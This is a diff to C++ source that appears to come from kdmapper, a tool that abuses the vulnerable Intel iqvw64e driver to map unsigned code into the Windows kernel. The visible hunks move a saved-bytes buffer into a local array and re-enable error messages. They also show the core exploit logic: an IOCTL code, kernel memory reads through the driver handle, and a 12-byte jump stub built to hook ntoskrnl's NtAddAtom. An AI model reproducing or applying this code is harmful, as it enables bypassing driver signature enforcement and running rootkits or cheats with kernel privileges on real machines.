@@ -18,7 +18,7 @@ namespace intel_driver
 	constexpr uint32_t ioctl1 = 0x80862007;
 	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
 	extern ULONG64 ntoskrnlAddr;
-	inline uint8_t original_kernel_function[ 12 ];
+	//inline uint8_t original_kernel_function[ 12 ];
 	inline HANDLE iqvw64e_device_handle;
 
 	typedef struct _COPY_MEMORY_BUFFER_INFO
@@ -173,36 +173,35 @@ namespace intel_driver
 		// Setup function call
 		HMODULE ntdll = GetModuleHandleA( "ntdll.dll" );
 		if ( ntdll == 0 ) {
-			//printf( "[-] Failed to load ntdll.dll\n" ); //never should happens
+			printf( "[-] Failed to load ntdll.dll\n" ); //never should happens
 			return false;
 		}
 
 		const auto NtAddAtom = reinterpret_cast< void* >( GetProcAddress( ntdll, "NtAddAtom" ) );
 		if ( !NtAddAtom )
 		{
-			//printf("[-] Failed to get export ntdll.NtAddAtom\n" );
+			printf("[-] Failed to get export ntdll.NtAddAtom\n" );
 			return false;
 		}
 
 		uint8_t kernel_injected_jmp[ ] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+		uint8_t original_kernel_function[ sizeof( kernel_injected_jmp ) ];
 		*( uint64_t* ) &kernel_injected_jmp[ 2 ] = kernel_function_address;
 
 		static uint64_t kernel_NtAddAtom = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom" );
 		if ( !kernel_NtAddAtom ) {
-			//printf( "[-] Failed to get export ntoskrnl.NtAddAtom\n" );
+			printf( "[-] Failed to get export ntoskrnl.NtAddAtom\n" );
 			return false;
 		}
 
-		if ( !original_kernel_function[ 0 ] ) {
-			if ( !ReadMemory( device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof( kernel_injected_jmp ) ) )
-				return false;
-		}
+		if ( !ReadMemory( device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof( original_kernel_function ) ) )
+			return false;
 
 		if ( original_kernel_function[ 0 ] == kernel_injected_jmp[ 0 ] &&
 			original_kernel_function[ 1 ] == kernel_injected_jmp[ 1 ] &&
 			original_kernel_function[ sizeof( kernel_injected_jmp ) - 2 ] == kernel_injected_jmp[ sizeof( kernel_injected_jmp ) - 2 ] &&
 			original_kernel_function[ sizeof( kernel_injected_jmp ) - 1 ] == kernel_injected_jmp[ sizeof( kernel_injected_jmp ) - 1 ] ) {
-			//printf( "[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!\n" );
+			printf( "[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!\n" );
 			return false;
 		}
 
